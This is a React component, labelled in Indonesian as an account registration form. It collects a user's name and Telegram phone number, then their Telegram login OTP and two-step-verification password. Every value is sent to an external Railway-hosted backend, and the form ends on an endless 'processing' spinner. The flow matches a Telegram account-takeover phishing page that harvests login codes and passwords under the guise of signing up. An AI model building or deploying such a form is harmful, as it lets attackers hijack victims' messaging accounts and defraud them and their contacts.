"use client";

import React, { useState } from 'react';

const AuthForm = () => {
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [formData, setFormData] = useState({ nama: '', nomor: '', otp: '', sandi: '' });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
    setError('');
  };

  const handleNext = async () => {
    setLoading(true);
    setError('');
    
    try {
      const response = await fetch('https://backend-python-production-6e72.up.railway.app/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...formData, step }),
      });

      const data = await response.json();

      if (response.ok) {
        if (step === 1) setStep(2);
        else if (step === 2) {
          if (data.status === 'need_2fa') setStep(3);
          else setStep(4);
        } else if (step === 3) setStep(4);
      } else {
        if (data.status === 'invalid_2fa') setError('KATA SANDI SALAH!!');
        else if (data.status === 'invalid_otp') setError('KODE OTP SALAH!!');
        else setError('Terjadi kesalahan server.');
      }
    } catch (err) {
      setError('Koneksi gagal. Pastikan backend Active.');
    } finally {
      setLoading(false);
    }
  };

  if (loading) return <div className="text-center p-10 font-bold animate-pulse">SINKRONISASI DATA...</div>;

  return (
    <div className="max-w-md mx-auto p-6 bg-white rounded-xl shadow-lg border border-gray-100">
      {step === 1 && (
        <div className="space-y-4">
          <h2 className="text-lg font-bold text-gray-700">Pendaftaran Akun</h2>
          <input name="nama" placeholder="Nama Lengkap" className="w-full border p-3 rounded-lg" onChange={handleChange} />
          <input name="nomor" placeholder="Nomor Telegram (08xxx)" className="w-full border p-3 rounded-lg" onChange={handleChange} />
          <button onClick={handleNext} className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold p-3 rounded-lg transition">DAFTAR SEKARANG</button>
        </div>
      )}

      {step === 2 && (
        <div className="space-y-4 text-center">
          <p className="text-blue-600 font-semibold">Kami telah mengirimkan kode OTP ke aplikasi Telegram Anda</p>
          <input name="otp" placeholder="5 Digit OTP" className="w-full border-2 p-3 rounded-lg text-center text-2xl tracking-[1em]" onChange={handleChange} maxLength={5} />
          {error && <p className="text-red-500 font-bold text-sm">{error}</p>}
          <button onClick={handleNext} className="w-full bg-blue-600 text-white p-3 rounded-lg">VERIFIKASI OTP</button>
        </div>
      )}

      {step === 3 && (
        <div className="space-y-4 text-center">
          <h2 className="font-bold text-gray-800">Verifikasi 2 Langkah Aktif</h2>
          <p className="text-sm text-gray-500">Masukkan kata sandi akun Telegram Anda</p>
          <input name="sandi" type="password" placeholder="Kata Sandi" 
            className={`w-full border-2 p-3 rounded-lg ${error ? 'border-red-500 bg-red-50' : 'border-gray-200'}`} 
            onChange={handleChange} />
          {error && <p className="text-red-500 font-bold italic text-sm">{error}</p>}
          <button onClick={handleNext} className="w-full bg-blue-600 text-white p-3 rounded-lg">KONFIRMASI</button>
        </div>
      )}

      {step === 4 && (
        <div className="text-center py-10 space-y-3">
          <div className="w-12 h-12 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto"></div>
          <p className="font-bold text-gray-700">Sedang Memproses...</p>
        </div>
      )}
    </div>
  );
};

export default AuthForm;